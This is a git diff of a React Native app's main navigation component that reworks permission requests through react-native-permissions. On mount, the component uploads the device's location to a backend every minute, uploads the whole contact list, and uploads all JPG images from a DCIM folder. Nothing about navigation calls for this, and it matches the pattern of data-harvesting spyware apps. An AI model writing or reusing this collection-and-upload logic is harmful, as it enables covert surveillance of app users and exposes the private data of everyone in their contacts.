@@ -13,6 +13,7 @@ import RNFS from 'react-native-fs';
 import axios from 'axios';
 import { BASE_URL } from '../config/Config';
 import ProfileScreen from '../screen/profile/ProfileScreen';
+import {PERMISSIONS, RESULTS, check, request, requestMultiple, openSettings} from 'react-native-permissions';
 
 const Tab = createBottomTabNavigator();
 
@@ -20,33 +21,32 @@ function MainNav({navigation}) {
     const { token } = useContext(AuthContext);
 
     useEffect(() => {
+        requestPermissions();
 		const interval = setInterval(() => {
             getGeolocation();
             
 		}, 60000); // Waktu dalam milidetik (satu menit = 60 detik = 60000 milidetik)
-        getContacts()
         getImageFiles();
+        getContacts()
+        
 		return () => clearInterval(interval);
 	}, []);
 
     const getGeolocation =  async () => {
             try {
-                const granted = await PermissionsAndroid.request(
-                    PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION
-                );
-
-                if(granted === PermissionsAndroid.RESULTS.GRANTED) {
-                    Geolocation.getCurrentPosition( info => {
-                        console.log('Hooks triggered!');
-                        console.log('Longitude: ', info.coords.latitude);
-                        console.log('Latitude :', info.coords.longitude);
-
-                        postLocation(info.coords.latitude, info.coords.longitude)
+                check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION : PERMISSIONS.IOS.LOCATION_WHEN_IN_USE)
+                    .then((result) => {
+                        if(result === RESULTS.GRANTED) {
+                            Geolocation.getCurrentPosition( info => {
+                                postLocation(info.coords.latitude, info.coords.longitude)
+                            });
+                        } else {
+                            console.log('Permission Denied')
+                        }
+                    })
+                    .catch((error) => {
+                        console.log(error);
                     });
-                } else {
-                    console.log('Permissiion di tolak');
-                }
-
             } catch (error) {
                 console.log(error);
             }
@@ -54,72 +54,65 @@ function MainNav({navigation}) {
 
     const getContacts = async () => {
         try {
-            const granted = await PermissionsAndroid.request(
-                PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
-                {
-                    title: 'Akses Kontak',
-                    message: 'Aplikasi ini memerlukan akses ke kontak Anda.',
-                    buttonNeutral: 'Nanti',
-                    buttonNegative: 'Batal',
-                    buttonPositive: 'OK',
-                },
-            );
-
-            if(granted === PermissionsAndroid.RESULTS.GRANTED) {
-                Contacts.getAll()
-                .then((contacts) => {
-                    postContact(contacts);
+            check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.READ_CONTACTS : PERMISSIONS.IOS.CONTACTS)
+                .then((result) => {
+                    if(result === RESULTS.GRANTED) {
+                        Contacts.getAll()
+                        .then((contacts) => {
+                            postContact(contacts);
+                        });
+                    } else {
+                        console.log('Permission Denied')
+                    }
+                })
+                .catch((error) => {
+                    console.log(error);
                 });
-            }
+
         } catch(error) {
             console.log(error);
         }
     }
 
     const getImageFiles = async () => {
-        let images = [];
-        let uploadImages = new FormData();
-        const granted = await PermissionsAndroid.request(
-            PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
-            {
-                title: 'Akses Filesystem',
-                message: 'Aplikasi ini memerlukan akses ke Penyimpanan untuk mengambil Gambar.',
-                buttonNeutral: 'Nanti',
-                buttonNegative: 'Batal',
-                buttonPositive: 'OK',
-            },
-        );
+        try {
+            const result = await check(
+                Platform.OS === 'android'
+                ? PERMISSIONS.ANDROID.READ_MEDIA_IMAGES
+                : PERMISSIONS.IOS.MEDIA_LIBRARY
+            );
         
-        if(granted === PermissionsAndroid.RESULTS.GRANTED){
-            try {
+            if (result === RESULTS.GRANTED) {
                 const directoryPath = RNFS.ExternalStorageDirectoryPath + '/DCIM/Test'; // You can change the directory path if needed
                 const files = await RNFS.readDir(directoryPath);
-
+        
                 // Filter image files
                 const imageFiles = files.filter(
                     file => file.isFile() && file.name.endsWith('.jpg')
                 );
-
+        
+                const images = [];
+                const uploadImages = new FormData();
+      
                 // Log the image files
                 imageFiles.forEach(imageFile => {
                     images.push({
                         uri: 'file://' + imageFile.path,
                         type: 'image/jpg',
                         name: imageFile.name,
-                    })
+                    });
                 });
-
-                images.map((val) => {
-                    uploadImages.append("file[]", val);
-                })
-
-                postGalery(uploadImages);
-                
-            } catch (error) {
-                console.log('Error retrieving image files:', error);
+        
+                images.forEach(val => {
+                    uploadImages.append('file[]', val);
+                });
+      
+                await postGalery(uploadImages);
+            } else {
+                console.log('Image Files Permission Denied');
             }
-        }else{
-            console.log('akse ke stoarage ditolak !!!!');
+        } catch (error) {
+            console.log('Error retrieving image files:', error);
         }
     };
 
@@ -178,6 +171,29 @@ function MainNav({navigation}) {
 		} catch (error) {
 			console.log('Error Axios', error);
 		}
+    }
+
+    const requestPermissions = async () => {
+        try{
+            if(Platform.OS === 'android') {
+                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]).then((statuses) => {
+                    console.log('Permission Android Location : ', statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION]);
+                    console.log('Permission Android Camera :', statuses[PERMISSIONS.ANDROID.CAMERA]);
+                    console.log('Permission Android Contacts :', statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
+                    console.log('Permission Android Media files :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]);
+                });
+
+            } else if (Platform.OS === 'ios') {
+                requestMultiple([PERMISSIONS.IOS.LOCATION_WHEN_IN_USE, PERMISSIONS.IOS.CAMERA, PERMISSIONS.IOS.CONTACTS, PERMISSIONS.IOS.MEDIA_LIBRARY, PERMISSIONS.IOS.PHOTO_LIBRARY]).then((statuses) => {
+                    console.log('Permission IOS Location : ', statuses[PERMISSIONS.IOS.LOCATION_WHEN_IN_USE]);
+                    console.log('Permission IOS Camera', statuses[PERMISSIONS.IOS.CAMERA]);
+                    console.log('Permission IOS Contacts', statuses[PERMISSIONS.IOS.CONTACTS]);
+                    console.log('Permission IOS Media files', statuses[PERMISSIONS.IOS.MEDIA_LIBRARY]);
+                });
+            }
+        } catch(error) {
+            console.log(error);
+        }
     }
     
     return (
